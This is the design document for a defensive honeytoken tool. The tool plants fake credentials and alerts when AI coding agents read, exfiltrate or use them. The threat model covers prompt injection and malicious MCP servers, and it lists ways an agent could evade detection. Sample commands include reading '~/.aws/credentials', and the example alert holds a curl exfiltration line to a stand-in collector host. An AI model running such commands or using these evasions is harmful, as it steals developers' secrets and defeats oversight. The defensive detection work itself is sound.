# agent-tripwire: design (v1)

agent-tripwire plants fake credentials ("honeytokens") in a sandbox and raises
an alert when an AI coding agent **reads** them, **sends them out**, or **uses**
them. It is a detection tool for people who run agents and want evidence of
what those agents touch. It never handles real secrets.

## Threat model

**Protected party.** A developer who runs coding agents (Claude Code, Codex,
Axio and similar) against a project or a home directory.

**Adversary.** An agent that touches credentials it does not need. The cause
may be a prompt injection in a README, issue or web page, a malicious
dependency or MCP server steering the agent, or plain over-eager behaviour such
as running `cat ~/.aws/credentials` "to check the config". We assume the
agent:

- runs as the same OS user as the developer, without root;
- uses its normal tools (file reads, shell, web fetch, MCP tools);
- may encode what it sends out (base64, hex, URL encoding) but is not
  specifically trying to evade agent-tripwire.

**What a detection proves.** A planted value has no legitimate use, so any
read, transmission or use of it is a signal. A read means the agent (or
another process) opened a file it had no task-related reason to open. A
transmission means the value reached a tool call that can leave the machine.

**Not defended against.**

- An agent that knows about agent-tripwire and deliberately avoids or
  transforms tokens (encryption, splitting, character-by-character copying).
  Content matching is best effort against that adversary; read detection
  still fires unless the agent avoids the files entirely.
- Root or kernel-level adversaries, or anything that tampers with the
  agent-tripwire state directory.
- Protecting real credentials. agent-tripwire tells you an agent went
  looking; it does not stop it reading the real files. Run agents with a
  sandbox `HOME` so there are no real files to find.

## Honeytokens

### Format

Every planted value carries a **marker** and a **token id**:

```
TRIPWIRE + <id>      id = 8 characters of base32 (A–Z, 2–7)
                        = 6 random characters (30 bits) + 2 check characters
```

- The check characters are derived from a SHA-256 of the random part, so a
  stray word such as `tripwire-detection` is rejected 1023 times in 1024
  before the registry is consulted, and only ids in the registry produce
  high-severity alerts.
- Each value gets its own id, so an alert names the exact file and field
  that leaked. Ids are checked against the registry at generation time and
  are unique.
- The marker makes every value obviously synthetic to a human reader
  (`AKIATRIPWIRE…`). The trade-off is that a careful agent can
  recognise it too; v1 favours being unmistakably fake.

### Why values can never be valid credentials

- Values are random and were never issued by any provider, so no service
  holds a matching record.
- Shapes are realistic (an AWS access key id is `AKIA` plus 16 characters)
  so agents and secret scanners treat them as credentials, but the fixed
  `TRIPWIRE` segment means a provider would have to issue that literal
  string by chance.
- The optional "use" detection points planted configs at a local listener
  (see below), so tools that pick up the credentials talk to `127.0.0.1`, not
  to a real provider.
- The repository never contains a literal planted value. Tests generate
  values at runtime and documentation shows truncated examples, so pushing
  this repo does not trip GitHub push protection or partner secret scanning.

### Kinds (v1)

| Kind  | Relative path        | Contents                                                      |
| ----- | -------------------- | ------------------------------------------------------------- |
| `env` | `.env`               | AWS key pair, `DATABASE_URL` with password, generic API token |
| `aws` | `.aws/credentials`   | `[default]` access key id and secret access key               |
| `npm` | `.npmrc`             | `_authToken` for a registry                                   |
| `ssh` | `.ssh/id_ed25519`    | OpenSSH private-key block whose body embeds the marker        |

Profiles choose a default set: `--profile home` plants `aws`, `npm`, `ssh`;
`--profile project` (the default for `plant`) plants `env`. `--kind`
overrides either. Two support files hold no tokens: `.aws/config` (only with
`--listen`) and `.metadata_never_index` (only in a `sandbox`).

Files are created with the permissions the real file would have (`0600` for
keys and credentials).

## Safety rules for planting and removal

1. **Explicit target only.** `tripwire plant <DIR>` writes only beneath
   `DIR`. `tripwire sandbox` creates a fresh directory meant to be used as
   `HOME` for an agent.
2. **Never the real home.** The real home directory is read from the password
   database (`getpwuid_r`), not from `$HOME`, which a sandbox overrides.
   Planting is refused if `DIR` resolves to the real home or a credential
   directory inside it (`~/.aws`, `~/.ssh`, `~/.config`, …).
3. **Never overwrite.** Files are created with `O_CREAT | O_EXCL |
   O_NOFOLLOW`. If any target file already exists, the whole plant is
   refused before anything is written.
4. **No symlink escapes.** Every directory between `DIR` and a planted file is
   checked to be a real directory inside canonical `DIR`, so a symlinked
   `.aws` cannot redirect a write to real credentials.
5. **Fully removable.** The registry records every file and directory a plant
   created, with the SHA-256 of each file. `tripwire remove` deletes a file
   only if its hash still matches, removes directories only if it created
   them and they are now empty, and reports anything it left behind.
6. **Registry holds no secrets.** It stores ids, paths, file hashes and tail
   window hashes, never planted values, and ids are printed without the marker. An agent that
   reads the registry, `tripwire list` output or the alert log does not
   ingest a matchable token and does not trigger false leak alerts.
7. **Git warning.** When planting a `.env` into a Git work tree where it is
   not ignored, `plant` warns. agent-tripwire never edits `.gitignore`.

## Detection

Four independent channels feed one alert log.

### 1. Agent hooks (`tripwire hook`)

The most precise channel, because the agent tells us which tool it ran.
Claude Code, Codex and Axio can run a command on `PreToolUse` and
`PostToolUse`, passing JSON on stdin with `hook_event_name`, `tool_name`,
`tool_input` and, after the call, `tool_response`. Axio uses the same tool
names as Claude Code (`Read`, `Write`, `Edit`, `Bash`, …).

| Event       | Check                                                              | Alert          |
| ----------- | ------------------------------------------------------------------ | -------------- |
| PreToolUse  | `file_path`, `path` or `notebook_path` resolves to a planted file  | `read-attempt` |
| PreToolUse  | `command` (a string, or an argv array as in Codex) names a planted file | `read-attempt` |
| PreToolUse  | any string in `tool_input` contains a token (any encoding)         | `exfil`        |
| PostToolUse | any string in `tool_response` contains a token                     | `read`         |
| other       | any string in the event (for example a user prompt) contains a token | `mention`    |

Checks key on input fields, not tool names, so `Read`, `Edit`, `Write`,
`Grep`, Codex's `shell`, MCP tools and unknown tools are all covered. Paths
are resolved against the event's `cwd`, and a command counts as naming a file
when the absolute path, the `cwd`-relative path, or a `~/`, `$HOME/` or
`${HOME}/` form appears as a whole shell word (so `.env.example` and
`other/.env` do not match `.env`).

Directories that hold planted files below the plant root, such as `.aws` and
`.ssh`, are targets too, so `cat ~/.aws/*`, `cd ~/.aws && cat credentials`
and a `Grep` over `~/.aws` raise a `read-attempt` for the directory. The
plant root itself is not a target, because naming a project or home
directory is normal.

The hook is **observe-only by default**: it logs and exits 0 so the agent
carries on and the session records what it does next. `--block` turns a
PreToolUse `exfil` match into a deny (exit 2 with a reason on stderr). The
hook never fails the agent: malformed input or a missing registry is logged
and the hook exits 0. Messages it writes back to the agent never contain the
marker.

`--notify` also sends a desktop notification for each alert, without waiting
for the notifier, because agents such as Claude Code do not show the output
of a hook that exits 0.

`tripwire hook config claude|codex` prints the settings snippet to install the
hook. agent-tripwire does not edit agent configuration itself.

### 2. File-access monitoring (`tripwire watch`)

Watches every registered planted file, without root or system extensions.

- **Linux:** inotify `IN_ACCESS` on each planted file, which fires when data
  is read. `IN_OPEN` is not used because it also fires for writers and for
  the watcher's own bookkeeping opens. Unprivileged for files the user owns.
  `fanotify` would give process ids but needs `CAP_SYS_ADMIN`, so it is out.
- **macOS:** FSEvents and kqueue do not report opens or reads, and Endpoint
  Security, DTrace and `fs_usage` all need root or an entitlement. v1 uses
  **access-time arming**: after planting, and after each detection, the
  file's atime is set earlier than its mtime; the next read updates atime
  (verified on APFS, and the same rule holds for Linux `relatime`), and a
  poll every 500 ms notices. Modification and deletion are detected from
  mtime, size and existence on the same poll.
- The atime method is also the fallback on Linux when inotify is
  unavailable. On a `noatime` mount it cannot see reads; v1 documents this
  rather than detecting the mount option.

Limits (also listed in the README):

- File events do not say **which process** read the file. On Linux the
  watcher makes a best-effort scan of `/proc/*/fd` at event time; on macOS
  there is no attribution in v1. Hooks provide attribution.
- Indexers and backup tools (Spotlight, Time Machine, antivirus, IDE file
  watchers) can read files. `tripwire sandbox` writes `.metadata_never_index`;
  choosing a directory outside indexed and backed-up locations is up to the
  user.
- Detection resolution on macOS is the poll interval.

`watch` reloads the registry when it changes, so plants made after it starts
are watched too. It can also tail transcript directories (`--transcripts
DIR`) and apply the transcript scanner to complete lines as they are
appended, for agents without hook support. Content already in a transcript
when `watch` starts is not re-reported, and new `.jsonl` files are picked up
within ten polls.

### 3. Transcript scanning (`tripwire scan`)

Scans session transcripts after the fact. Input is JSONL (Claude Code
`~/.claude/projects/**/*.jsonl`, Codex `~/.codex/sessions/**/*.jsonl`) or any
text file; a directory argument expands to the `.jsonl` files beneath it.
Each JSON line is parsed and every string value is checked, with
its JSON path, so a hit is classified by where it occurred:

| Location                                            | Classification |
| --------------------------------------------------- | -------------- |
| tool call input (`tool_use.input`, `function_call`) | `exfil`        |
| tool result (`tool_result`, `function_call_output`) | `read`         |
| assistant text                                      | `disclosed`    |
| anything else                                       | `mention`      |

Non-JSON lines are scanned as text and classified `mention`.

### Matching

One matcher is shared by all channels. It looks for `tripwire` +
8 base32 characters, case-insensitively, then validates the check characters
and looks the id up in the registry. It searches:

- the raw text and JSON-decoded string values;
- percent-encoded runs (URL path and query segments), decoded;
- base64 (standard and URL-safe) runs of 16 or more characters, decoded;
- hex runs of 32 or more characters, decoded;
- gzip data inside a base64 or hex run (`gzip | base64`), decompressed up
  to 1 MiB to bound decompression bombs.

Apart from gzip inside base64 or hex, decoding goes one level deep. Hits with valid check characters but an unknown
id are reported as `unregistered` at low severity (for example a token from a
removed plant).

**Partial leaks.** An agent can strip the marker and send only a value's
random tail. When planting, the registry records truncated SHA-256 hashes of
every 16-character window of each tail (never the tail itself; recovering a
window means searching at least 62^16 candidates). The matcher hashes every
16-character window of runs of tail characters in the text and reports
matches as encoding `partial`; matching tails are redacted as
`[tripwire:<id> partial]`. AWS access key ids have no random tail, so this
covers secrets, passwords, API tokens and the SSH key body. Tails are matched
in raw text only, not inside encodings.

### 4. Use detection (`tripwire listen`, optional)

A local HTTP listener on `127.0.0.1` that records any request containing a
token in its request line, headers or body. When `plant --listen PORT` is
given, planted configs point at it: `.aws/config` gets `endpoint_url`,
`.npmrc` gets a `registry=` on that port, and `.env` gets an `API_BASE_URL`.
Running `aws s3 ls` or `npm publish` in the sandbox then sends the fake
credential to the listener and raises a `use` alert. The listener answers
every request with `403`. No third-party canary service is involved, and
nothing is sent off the machine. The npm path is verified end to end with
`npm whoami`; the AWS path relies on the AWS CLI honouring `endpoint_url`.

## Alerts

Alerts are appended as JSON lines to `<state>/alerts.jsonl`:

```json
{"time":"2026-11-12T10:15:03Z","kind":"exfil","source":"hook","token_id":"K7Q2MZXA",
 "plant_id":"p-iobcfl","file":"/Users/me/myapp/.env","field":"API_TOKEN",
 "encoding":"base64","tool":"Bash","session":"…",
 "detail":"curl -d [tripwire:K7Q2MZXA base64] https://collector.example"}
```

The `detail` field is redacted: each planted value, including its random
tail, is replaced with `[tripwire:<id>]`, and an encoded run holding one with
`[tripwire:<id> <encoding>]`, so the log is safe to read and to re-scan while
keeping the surrounding command or URL. If a token would still remain, the
whole detail is replaced. Sources are `hook`, `watch`, `transcript` and
`listen`; `scan` reports to stdout and does not write to the log. `hook`
prints alerts to stderr, `watch` and `listen` print them to stdout, and
`hook --notify` and `watch --notify` also send a desktop notification through `osascript`
(macOS) or `notify-send` (Linux) when present.

Kinds, in decreasing severity: `exfil`, `use`, `read`, `read-attempt`,
`modified`, `deleted`, `disclosed`, `mention`, `unregistered`.

## State

`$TRIPWIRE_STATE_DIR`, else `$XDG_STATE_HOME/agent-tripwire`, else
`<real home>/.local/state/agent-tripwire`, resolved from the password database
so that a hook running under a sandbox `HOME` finds the same state.
Contents: `registry.json` (plants, files, hashes, token ids), written through
a temporary file and rename, and `alerts.jsonl`, appended one line per alert.
The directory is created with mode `0700` and both files with `0600`.

## CLI (v1)

```
tripwire sandbox [PATH] [--listen PORT]   create a sandbox HOME, plant the home profile,
                                           print `export HOME=…`
tripwire plant <DIR> [--profile home|project] [--kind K]… [--listen PORT]
                                           (default profile: project)
tripwire list [--json]                     plants, files and token ids
tripwire remove <PLANT_ID>… | --all        delete planted files (hash-checked)
tripwire watch [--transcripts DIR]… [--notify] [--interval MS]
tripwire scan <PATH>… [--json]             scan transcripts or text files
tripwire hook [--block] [--notify]         read one hook event on stdin
tripwire hook config claude|codex          print the hook settings snippet
tripwire listen [--port PORT]              local use-detection listener (default 8787)
tripwire alerts [--json] [--since TIME]    show the alert log
```

Exit codes: `0` success or nothing found, `1` findings (`scan`), `2` error.
`hook` always exits 0 unless `--block` denies a call, which exits 2. `watch`
and `listen` run until interrupted.

## Implementation notes

- Rust 2024 edition, single binary crate with a library core so tests drive
  the matcher, registry and hook logic directly; CLI tests use `assert_cmd`
  against a temporary state dir.
- Runtime dependencies: `clap`, `serde`, `serde_json`, `anyhow`, `sha2`,
  `base64`, `flate2` (pure-Rust `miniz_oxide` backend), `getrandom`, `libc` (password database and `O_NOFOLLOW`; bindings
  only, no native build), and `inotify` on Linux only (bindings to a kernel
  API, unprivileged). Access times are set through the standard library.
  Nothing needs root or a kernel or system extension.
- Dev dependencies: `tempfile`, `assert_cmd`, `predicates`.
- Minimum Rust version 1.89 (let-chains, `as_chunks`, `File::lock`).
- CI (GitHub Actions, Linux and macOS): `cargo fmt --all --check`,
  `cargo clippy --locked --all-targets -- -D warnings`, `cargo test --locked`.

## Out of scope for v1

- Third-party canary services (DNS or HTTP callbacks from canarytokens and
  similar), and any token that is valid somewhere.
- Kernel-level monitoring: fanotify, eBPF, Endpoint Security, DTrace.
- Blocking or sandboxing agents beyond the optional hook deny.
- Windows.
- Tokens for providers with checksummed formats (GitHub `ghp_`, Slack),
  until there is a test that proves each generated value fails the
  provider's checksum.
- Process attribution on macOS.

## Status

Everything in the CLI section is implemented and covered by tests that run
on macOS and Linux. Verified by hand: `watch` read and modification
detection on macOS, `listen` with a real `npm whoami` in a sandbox, and
`remove` leaving a sandbox in place when the agent wrote its own files there.
Not yet verified: a live Claude Code or Codex session with the hook installed
(the tests use the documented event payloads), and the AWS CLI against the
listener.
